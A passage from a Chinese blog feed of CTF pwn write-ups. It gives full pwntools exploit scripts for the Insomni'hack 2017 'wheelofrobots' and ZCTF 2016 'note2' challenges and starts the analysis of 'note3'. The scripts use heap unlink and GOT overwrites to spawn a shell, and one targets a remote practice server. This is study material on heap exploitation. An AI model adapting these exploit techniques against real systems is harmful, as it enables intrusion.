src="/2023/03/16/2017-insomn-hack-wheelofrobots/image-20230317003427076.png" alt="image-20230317003427076"></p><h3 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line">pwnfile=<span class="string">&#x27;./wheelofrobots&#x27;</span></span><br><span class="line">elf = ELF(pwnfile)</span><br><span class="line">rop = ROP(pwnfile)</span><br><span class="line"><span class="keyword">if</span> args[<span class="string">&#x27;REMOTE&#x27;</span>]:</span><br><span class="line">    io = remote()</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = process(pwnfile)</span><br><span class="line">r = <span class="keyword">lambda</span> x: io.recv(x)</span><br><span class="line">ra = <span class="keyword">lambda</span>: io.recvall()</span><br><span class="line">rl = <span class="keyword">lambda</span>: io.recvline(keepends=<span class="literal">True</span>)</span><br><span class="line">ru = <span class="keyword">lambda</span> x: io.recvuntil(x, drop=<span class="literal">True</span>)</span><br><span class="line">s = <span class="keyword">lambda</span> x: io.send(x)</span><br><span class="line">sl = <span class="keyword">lambda</span> x: io.sendline(x)</span><br><span class="line">sa = <span class="keyword">lambda</span> x, y: io.sendafter(x, y)</span><br><span class="line">sla = <span class="keyword">lambda</span> x, y: io.sendlineafter(x, y)</span><br><span class="line">ia = <span class="keyword">lambda</span>: io.interactive()</span><br><span class="line">c = <span class="keyword">lambda</span>: io.close()</span><br><span class="line">li = <span class="keyword">lambda</span> x: log.info(x)</span><br><span class="line">db = <span class="keyword">lambda</span> x : gdb.attach(io,x)</span><br><span class="line">p =<span class="keyword">lambda</span> x,y:success(x+<span class="string">&#x27;--&gt;&#x27;</span>+<span class="built_in">hex</span>(y))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">offset_bin_main_arena</span>(<span class="params">idx</span>):</span><br><span class="line">    word_bytes = context.word_size / <span class="number">8</span></span><br><span class="line">    offset = <span class="number">4</span>  <span class="comment"># lock</span></span><br><span class="line">    offset += <span class="number">4</span>  <span class="comment"># flags</span></span><br><span class="line">    offset += word_bytes * <span class="number">10</span>  <span class="comment"># offset fastbin</span></span><br><span class="line">    offset += word_bytes * <span class="number">2</span>  <span class="comment"># top,last_remainder</span></span><br><span class="line">    offset += idx * <span class="number">2</span> * word_bytes  <span class="comment"># idx</span></span><br><span class="line">    offset -= word_bytes * <span class="number">2</span>  <span class="comment"># bin overlap</span></span><br><span class="line">    <span class="keyword">return</span> offset</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">idx, size=<span class="number">0</span></span>):</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;Your choice :&#x27;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;Your choice :&#x27;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(idx).encode())</span><br><span class="line">    <span class="keyword">if</span> idx == <span class="number">2</span>:</span><br><span class="line">        io.recvuntil(<span class="string">b&quot;Increase Bender&#x27;s intelligence: &quot;</span>)</span><br><span class="line">        io.sendline(<span class="built_in">str</span>(size).encode())</span><br><span class="line">    <span class="keyword">elif</span> idx == <span class="number">3</span>:</span><br><span class="line">        io.recvuntil(<span class="string">b&quot;Increase Robot Devil&#x27;s cruelty: &quot;</span>)</span><br><span class="line">        io.sendline(<span class="built_in">str</span>(size).encode())</span><br><span class="line">    <span class="keyword">elif</span> idx == <span class="number">6</span>:</span><br><span class="line">        io.recvuntil(<span class="string">b&quot;Increase Destructor&#x27;s powerful: &quot;</span>)</span><br><span class="line">        io.sendline(<span class="built_in">str</span>(size).encode())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">remove</span>(<span class="params">idx</span>):</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;Your choice :&#x27;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;Your choice :&#x27;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(idx).encode())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">change</span>(<span class="params">idx, name</span>):</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;Your choice :&#x27;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;Your choice :&#x27;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(idx).encode())</span><br><span class="line">    io.recvuntil(<span class="string">b&quot;Robot&#x27;s name: \n&quot;</span>)</span><br><span class="line">    io.send(name)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">start_robot</span>():</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;Your choice :&#x27;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">overflow_benderinuse</span>(<span class="params">inuse</span>):</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;Your choice :&#x27;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;Your choice :&#x27;</span>)</span><br><span class="line">    io.send(<span class="string">b&#x27;9999&#x27;</span> + inuse)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">write</span>(<span class="params">where, what</span>):</span><br><span class="line">    change(<span class="number">1</span>, p64(where))</span><br><span class="line">    change(<span class="number">6</span>, p64(what))</span><br><span class="line"></span><br><span class="line"><span class="comment"># db(&#x27;b *0x004014B8&#x27;)#change 2</span></span><br><span class="line"><span class="comment"># db(&#x27;b *0x401314&#x27;)#remove 3</span></span><br><span class="line">db(<span class="string">&#x27;b *0x401725&#x27;</span>)<span class="comment">#exit</span></span><br><span class="line">add(<span class="number">2</span>, <span class="number">1</span>)</span><br><span class="line">remove(<span class="number">2</span>)</span><br><span class="line">overflow_benderinuse(<span class="string">b&#x27;\x01&#x27;</span>)</span><br><span class="line">change(<span class="number">2</span>, p64(<span class="number">0x603138</span>))</span><br><span class="line">overflow_benderinuse(<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">add(<span class="number">2</span>, <span class="number">1</span>)</span><br><span class="line">add(<span class="number">3</span>,<span class="number">0x21</span>)</span><br><span class="line">add(<span class="number">1</span>)</span><br><span class="line">remove(<span class="number">2</span>)</span><br><span class="line">remove(<span class="number">3</span>)</span><br><span class="line">add(<span class="number">6</span>,<span class="number">3</span>)</span><br><span class="line">add(<span class="number">3</span>,<span class="number">7</span>)</span><br><span class="line">change(<span class="number">1</span>,p64(<span class="number">0x80</span>))</span><br><span class="line"></span><br><span class="line">target = <span class="number">0x6030E8</span></span><br><span class="line">fd = target - <span class="number">0x18</span></span><br><span class="line">bk = target - <span class="number">0x10</span></span><br><span class="line">payload = p64(<span class="number">0</span>) + p64(<span class="number">0x31</span>) + p64(fd) + p64(bk) + <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x10</span> + p64(<span class="number">0x30</span>) + <span class="string">b&#x27;a&#x27;</span>*<span class="number">8</span></span><br><span class="line">payload += p64(<span class="number">0x40</span>) + p64(<span class="number">0xa0</span>)</span><br><span class="line">change(<span class="number">6</span>,payload)</span><br><span class="line">remove(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">free_got = elf.got[<span class="string">&#x27;free&#x27;</span>]</span><br><span class="line">puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">atoi_got = elf.got[<span class="string">&#x27;atoi&#x27;</span>]</span><br><span class="line">puts_plt = elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># first way++++++++++++++++++++++++++</span></span><br><span class="line"><span class="comment"># overflow_benderinuse(b&#x27;\x01&#x27;)</span></span><br><span class="line"><span class="comment"># payload = p64(0)*3+ p64(free_got)+p64(puts_got)+p64(atoi_got)</span></span><br><span class="line"><span class="comment"># change(6,payload)</span></span><br><span class="line"><span class="comment"># change(6,p64(puts_plt))</span></span><br><span class="line"><span class="comment"># remove(2)</span></span><br><span class="line"><span class="comment"># puts_ad=u64(r(6).ljust(8,b&#x27;\x00&#x27;))</span></span><br><span class="line"><span class="comment"># p(&#x27;puts&#x27;,puts_ad)</span></span><br><span class="line"><span class="comment"># libc=LibcSearcher(&#x27;puts&#x27;,puts_ad)</span></span><br><span class="line"><span class="comment"># base=puts_ad-libc.dump(&#x27;puts&#x27;)</span></span><br><span class="line"><span class="comment"># system=libc.dump(&#x27;system&#x27;)+base</span></span><br><span class="line"><span class="comment"># change(1,p64(system))</span></span><br><span class="line"><span class="comment"># sla(b&#x27;oice : &#x27;,b&#x27;sh\x00&#x27;)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># second way+++++++++++++++++++</span></span><br><span class="line">payload = p64(<span class="number">0</span>)*<span class="number">2</span> + <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x18</span> + p64(<span class="number">0x6030e8</span>)</span><br><span class="line">change(<span class="number">6</span>,payload)</span><br><span class="line">write(<span class="number">0x603130</span>, <span class="number">3</span>)</span><br><span class="line">leaveret=<span class="number">0x40172a</span></span><br><span class="line">ret=<span class="number">0x40172b</span></span><br><span class="line">write(elf.got[<span class="string">&#x27;exit&#x27;</span>], leaveret)</span><br><span class="line">change(<span class="number">1</span>,p64(elf.got[<span class="string">&#x27;puts&#x27;</span>]))</span><br><span class="line">sla(<span class="string">b&#x27;choice : &#x27;</span>, <span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line">ru(<span class="string">b&#x27;great!! Thx &#x27;</span>)</span><br><span class="line">puts_ad=u64(r(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">p(<span class="string">&#x27;puts&#x27;</span>,puts_ad)</span><br><span class="line">libc=LibcSearcher(<span class="string">&#x27;puts&#x27;</span>,puts_ad)</span><br><span class="line">base=puts_ad-libc.dump(<span class="string">&#x27;puts&#x27;</span>)</span><br><span class="line">system=libc.dump(<span class="string">&#x27;system&#x27;</span>)+base</span><br><span class="line"><span class="built_in">bin</span>=libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)+base</span><br><span class="line">write(elf.got[<span class="string">&#x27;free&#x27;</span>], system)</span><br><span class="line">change(<span class="number">1</span>,p64(<span class="built_in">bin</span>))</span><br><span class="line">remove(<span class="number">6</span>)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> Unlink </tag>
            
            <tag> Fastbin Attach </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Unlink 2016-ZCTF-note2-and-note3</title>
      <link href="/2023/03/15/2016-ZCTF-note2-and-note3/"/>
      <url>/2023/03/15/2016-ZCTF-note2-and-note3/</url>
      
        <content type="html"><![CDATA[<h2 id="2016-ZCTF-note2"><a href="#2016-ZCTF-note2" class="headerlink" title="2016-ZCTF-note2"></a>2016-ZCTF-note2</h2><p><a href="https://files.buuoj.cn/files/761fb16a644de97e745bb29b281c0fff/note2">https://files.buuoj.cn/files/761fb16a644de97e745bb29b281c0fff/note2</a></p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">grxer@Ubuntu16:~/Desktop/pwn/heap$ checksec note2</span><br><span class="line">[*] &#x27;/home/grxer/Desktop/pwn/heap/note2&#x27;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure><p>没开pie而且有指针全局数组再bss段，最多四个堆块，可通过数组里的指针编辑修改数据，优先考虑unlink</p><p>找找哪里有堆溢出不</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 __fastcall <span class="title function_">ReadStr</span><span class="params">(<span class="type">char</span> *s, __int64 len, <span class="type">char</span> a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> buf; <span class="comment">// [rsp+2Fh] [rbp-11h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 i; <span class="comment">// [rsp+30h] [rbp-10h]</span></span><br><span class="line">  <span class="type">ssize_t</span> v7; <span class="comment">// [rsp+38h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0LL</span>; len - <span class="number">1</span> &gt; i; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    v7 = read(<span class="number">0</span>, &amp;buf, <span class="number">1uLL</span>);</span><br><span class="line">    <span class="keyword">if</span> ( v7 &lt;= <span class="number">0</span> )</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    <span class="keyword">if</span> ( buf == a3 )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    s[i] = buf;</span><br><span class="line">  &#125;</span><br><span class="line">  s[i] = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">return</span> i;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>自定义了一个输入函数，可惜忽略了signed数和unsigned数比较时signed会转变为unsigned数，我们malloc(0)时，len-1为-1,-1和unsigned i比较时会变为0xffffffff，可以堆溢出</p><p>malloc(0)时，glibc 的要求 chunk 块至少可以存储 4 个必要的字段 (prev_size,size,fd,bk)，所以会分配 0x20 的空间。</p><h2 id="伪造unlink-chunk"><a href="#伪造unlink-chunk" class="headerlink" title="伪造unlink chunk"></a>伪造unlink chunk</h2><p>content &#x3D; b’a’ * 8 + p64(0xa1) + p64(fakefd) + p64(fakebk) + b’b’ * 0x48<br>newnote(0x80, content)<br>newnote(0, ‘a’ * 8)<br>newnote(0x80, ‘b’ * 16)</p><p>在chunk0里伪造chunk，为了绕过&#x3D;P的检测我们</p><p>ptr &#x3D; 0x0000000000602120 这里存储的是伪造chunk的开始地址<br>fakefd &#x3D; ptr - 0x18<br>fakebk &#x3D; ptr - 0x10</p><p>这里我们不能直接在chunk1申请时进行溢出，因为那时候我们还没有申请到chunk2，溢出会到topchunk，</p><p>我们先删除在申请就可以，因为大小是fastbin，再申请还是那个堆</p><p>deletenote(1)<br>content &#x3D; b’a’ * 16 + p64(0xa0) + p64(0x90)<br>newnote(0,content)</p><p>这样我们就可以溢出chunk2</p><p>deletenote(2) unlink</p><p><img src="/2023/03/15/2016-ZCTF-note2-and-note3/image-20230315170826792.png" alt="image-20230315170826792"></p><p>和我们上一篇文章讨论的一样把ptr地址内容改为ptr-0x18</p><h2 id="leak-拿shell"><a href="#leak-拿shell" class="headerlink" title="leak 拿shell"></a>leak 拿shell</h2><p>修改chunk0把ptr[0]修改为atoi_got,直接show就可以泄露出来atoi地址</p><p>atoi_got &#x3D; elf.got[‘atoi’]<br>content &#x3D; b’a’ * 0x18 + p64(atoi_got)<br>editnote(0, 1, content)<br>shownote(0)</p><p><img src="/2023/03/15/2016-ZCTF-note2-and-note3/image-20230315171243972.png" alt="image-20230315171243972"></p><p>再利用edit改写其got为system，输入binsh拿shell即可</p><p>content &#x3D; p64(system)<br>editnote(0, 1, content)<br>ru(b’option—&gt;&gt;’)<br>sl(b’&#x2F;bin&#x2F;sh\x00’)</p><p><img src="/2023/03/15/2016-ZCTF-note2-and-note3/image-20230315164908151.png" alt="image-20230315164908151"></p><h3 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line">pwnfile=<span class="string">&#x27;./note2&#x27;</span></span><br><span class="line">elf = ELF(pwnfile)</span><br><span class="line">rop = ROP(pwnfile)</span><br><span class="line"><span class="keyword">if</span> args[<span class="string">&#x27;REMOTE&#x27;</span>]:</span><br><span class="line">    io = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="string">&#x27;29970&#x27;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = process(pwnfile)</span><br><span class="line">r = <span class="keyword">lambda</span> x: io.recv(x)</span><br><span class="line">ra = <span class="keyword">lambda</span>: io.recvall()</span><br><span class="line">rl = <span class="keyword">lambda</span>: io.recvline(keepends=<span class="literal">True</span>)</span><br><span class="line">ru = <span class="keyword">lambda</span> x: io.recvuntil(x, drop=<span class="literal">True</span>)</span><br><span class="line">s = <span class="keyword">lambda</span> x: io.send(x)</span><br><span class="line">sl = <span class="keyword">lambda</span> x: io.sendline(x)</span><br><span class="line">sa = <span class="keyword">lambda</span> x, y: io.sendafter(x, y)</span><br><span class="line">sla = <span class="keyword">lambda</span> x, y: io.sendlineafter(x, y)</span><br><span class="line">ia = <span class="keyword">lambda</span>: io.interactive()</span><br><span class="line">c = <span class="keyword">lambda</span>: io.close()</span><br><span class="line">li = <span class="keyword">lambda</span> x: log.info(x)</span><br><span class="line">db = <span class="keyword">lambda</span> x : gdb.attach(io,x)</span><br><span class="line">p =<span class="keyword">lambda</span> x,y:success(x+<span class="string">&#x27;--&gt;&#x27;</span>+<span class="built_in">hex</span>(y))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">newnote</span>(<span class="params">length, content</span>):</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;option---&gt;&gt;&#x27;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;(less than 128)&#x27;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(length).encode())</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;content:&#x27;</span>)</span><br><span class="line">    io.sendline(content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">shownote</span>(<span class="params"><span class="built_in">id</span></span>):</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;option---&gt;&gt;&#x27;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;note:&#x27;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(<span class="built_in">id</span>).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">editnote</span>(<span class="params"><span class="built_in">id</span>, choice, s</span>):</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;option---&gt;&gt;&#x27;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;note:&#x27;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(<span class="built_in">id</span>).encode())</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;2.append]&#x27;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(choice).encode())</span><br><span class="line">    io.sendline(s)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">deletenote</span>(<span class="params"><span class="built_in">id</span></span>):</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;option---&gt;&gt;&#x27;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;note:&#x27;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(<span class="built_in">id</span>).encode())</span><br><span class="line"><span class="comment"># db(&#x27;b* 0x400C65&#x27;)#new</span></span><br><span class="line"><span class="comment"># db(&#x27;b* 0x400CE4&#x27;)#delete</span></span><br><span class="line">db(<span class="string">&#x27;b *0x400F74&#x27;</span>)<span class="comment">#edit</span></span><br><span class="line">io.recvuntil(<span class="string">&#x27;name:&#x27;</span>)</span><br><span class="line">io.sendline(<span class="string">&#x27;hello&#x27;</span>)</span><br><span class="line">io.recvuntil(<span class="string">&#x27;address:&#x27;</span>)</span><br><span class="line">io.sendline(<span class="string">&#x27;grxer&#x27;</span>)</span><br><span class="line">ptr = <span class="number">0x0000000000602120</span></span><br><span class="line">fakefd = ptr - <span class="number">0x18</span></span><br><span class="line">fakebk = ptr - <span class="number">0x10</span></span><br><span class="line">content = <span class="string">b&#x27;a&#x27;</span> * <span class="number">8</span> + p64(<span class="number">0xa1</span>) + p64(fakefd) + p64(fakebk) + <span class="string">b&#x27;b&#x27;</span> * <span class="number">0x48</span></span><br><span class="line">newnote(<span class="number">0x80</span>, content)</span><br><span class="line">newnote(<span class="number">0</span>, <span class="string">&#x27;a&#x27;</span> * <span class="number">8</span>)</span><br><span class="line">newnote(<span class="number">0x80</span>, <span class="string">&#x27;b&#x27;</span> * <span class="number">16</span>)</span><br><span class="line">deletenote(<span class="number">1</span>)</span><br><span class="line">content = <span class="string">b&#x27;a&#x27;</span> * <span class="number">16</span> + p64(<span class="number">0xa0</span>) + p64(<span class="number">0x90</span>)</span><br><span class="line">newnote(<span class="number">0</span>,content)</span><br><span class="line">deletenote(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">atoi_got = elf.got[<span class="string">&#x27;atoi&#x27;</span>]</span><br><span class="line">content = <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x18</span> + p64(atoi_got)</span><br><span class="line">editnote(<span class="number">0</span>, <span class="number">1</span>, content)</span><br><span class="line">shownote(<span class="number">0</span>)</span><br><span class="line">ru(<span class="string">b&#x27;is &#x27;</span>)</span><br><span class="line">atoi_ad=u64(r(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">p(<span class="string">&#x27;atoi&#x27;</span>,atoi_ad)</span><br><span class="line">libc=LibcSearcher(<span class="string">&#x27;atoi&#x27;</span>,atoi_ad)</span><br><span class="line">base=atoi_ad-libc.dump(<span class="string">&#x27;atoi&#x27;</span>)</span><br><span class="line">system=libc.dump(<span class="string">&#x27;system&#x27;</span>)+base</span><br><span class="line">content = p64(system)</span><br><span class="line">editnote(<span class="number">0</span>, <span class="number">1</span>, content)</span><br><span class="line">ru(<span class="string">b&#x27;option---&gt;&gt;&#x27;</span>)</span><br><span class="line">sl(<span class="string">b&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h2 id="2016-ZCTF-note3"><a href="#2016-ZCTF-note3" class="headerlink" title="2016-ZCTF-note3"></a>2016-ZCTF-note3</h2><p><a href="https://files.buuoj.cn/files/569bb2532339a0bd669f5d2457526ba7/zctf_2016_note3">https://files.buuoj.cn/files/569bb2532339a0bd669f5d2457526ba7/zctf_2016_note3</a></p><p>和note2一样的保护</p><p>和note2相比，这次可以申请最多7个chunk，全局指针数组0x6020C0的0是最近申请或修改过的指针，后面依次顺序是malloc的chunk</p><p>这次没有了show函数帮我方便的leak地址</p><p>老的堆溢出的漏洞依旧存在</p><p>还有了新的堆溢出方式</p><h3 id="第一种溢出方式"><a href="#第一种溢出方式" class="headerlink" title="第一种溢出方式"></a>第一种溢出方式</h3><p>和之前一下自定义read时-1转换为无符号读取即可</p><h3 id="第二种溢出方式"><a href="#第二种溢出方式" class="headerlink" title="第二种溢出方式"></a>第二种溢出方式</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">edit</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 v0; <span class="comment">// rax</span></span><br><span class="line">  __int64 v1; <span class="comment">// rax</span></span><br><span class="line">  __int64 v3; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Input the id of the note:&quot;</span>);</span><br><span class="line">  v0 = getsize();</span><br><span class="line">  v3 = v0 % <span class="number">7</span>;</span><br><span class="line">  <span class="keyword">if</span> ( v0 % <span class="number">7</span> &gt;= v0 )</span><br><span class="line">  &#123;</span><br><span class="line">    v1 = (__int64)*(&amp;ptr + v3);</span><br><span class="line">    <span class="keyword">if</span> ( v1 )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;Input the new content:&quot;</span>);</span><br><span class="line">      myread((__int64)*(&amp;ptr + v3), ptr_st[v3 + <span class="number">8</span>], <span class="number">10</span>);</span><br><span class="line">      ptr_st[<span class="number">0</span>] = (__int64)*(&amp;ptr + v3);</span><br><span class="line">      LODWORD(v1) = <span class="built_in">puts</span>(<span class="string">&quot;Edit success&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    LODWORD(v1) = <span class="built_in">puts</span>(<span class="string">&quot;please input correct id.&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> v1;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">__int64 <span class="title function_">getsize</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 v1; <span class="comment">// [rsp+8h] [rbp-38h]</span></span><br><span class="line">  <span class="type">char</span> nptr[<span class="number">40</span>]; <span class="comment">// [rsp+10h] [rbp-30h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v3; <span class="comment">// [rsp+38h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v3 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  myread((__int64)nptr, <span class="number">32LL</span>, <span class="number">10</span>);</span><br><span class="line">  v1 = atol(nptr);</span><br><span class="line">  <span class="keyword">if</span> ( v1 &lt; <span class="number">0</span> )</span><br><span class="line">    <span class="keyword">return</span> -v1;</span><br><span class="line">  <span class="keyword">return</span> v1;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p><strong>NEG指令 -x&#x3D;~x+1</strong></p><p>当x为该位数可以表示的最大负数时，比如int 最大负数0x80000000 </p><img src="/2023/03/15/2016-ZCTF-note2-and-note3/image-20230315233602653.png" alt="image-20230315233602653" style="zoom:67%;"><p>取反+1还是0x80000000 </p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span> &#123;</span><br><span class="line">    <span class="type">int</span> v2 = <span class="number">-2147483648</span>;</span><br><span class="line">    <span class="keyword">if</span> (v2==-v2) &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;ohhhhh&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2023/03/15/2016-ZCTF-note2-and-note3/image-20230315233803481.png" alt="image-20230315233803481"></p></blockquote><p>这里我们输入最大负整数-9223372036854775808，getsize返回-v1还是这个值给到edit里的v0，v3&#x3D;-1，同时满足 v0 % 7 &gt;&#x3D; v0</p><p><code>myread((__int64)*(&amp;ptr + v3), ptr_st[v3 + 8], 10);</code></p><p>这样我们修改ptr[-1]也就是最近使用的堆，大小为ptr_st[-1 + 8]，第6个chunk的大小，我们把第6个chunk地址申请的比最近使用的那个大就可以实现堆溢出</p><h3 id="第三种"><a href="#第三种" class="headerlink" title="第三种"></a>第三种</h3><p>new时检测了chunk个数是不是大于7，但是只是puts，并没有实质性的阻值申请，申请后会把chunk8的ptr放到ptr数组开头的同时会把ptr放到，chunk1的size指针地址里，改变了chunk1的size，可以实现溢出</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> ( i == <span class="number">7</span> )</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Note is full, add fail&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Input the length of the note content:(less than 1024)&quot;</span>)</span><br><span class="line">      </span><br><span class="line">  *(&amp;ptr + i) = v3;</span><br><span class="line">  ptr_st[i + <span class="number">8</span>] = size;</span><br><span class="line">  ptr_st[<span class="number">0</span>] = (__int64)*(&amp;ptr + i);</span><br></pre></td></tr></table></figure><h3 id="其他好说"><a href="#其他好说" class="headerlink" title="其他好说"></a>其他好说</h3><p>常规构造unlink后，没有show方便泄露地址，我们可以自己利用puts自己泄露</p><p>改写freegot内容为puts，<strong>这里改写时要注意发送7个字节即可p64(puts_plt)[:-1]，如果8个字节+一个&#x2F;n,&#x2F;n最后又被置零，所以覆盖freegot时，会误覆盖freegot的下一个putsgot最低一个字节为\x00造成程序崩溃</strong></p><p>改写另一个chunk指针为puts_plt，free这个chunk可以泄露地址，</p><p>再改写atoi-got为system即可</p><p><img src="/2023/03/15/2016-ZCTF-note2-and-note3/image-20230316002002255.png" alt="image-20230316002002255"></p><h3 id="EXP-1"><a href="#EXP-1" 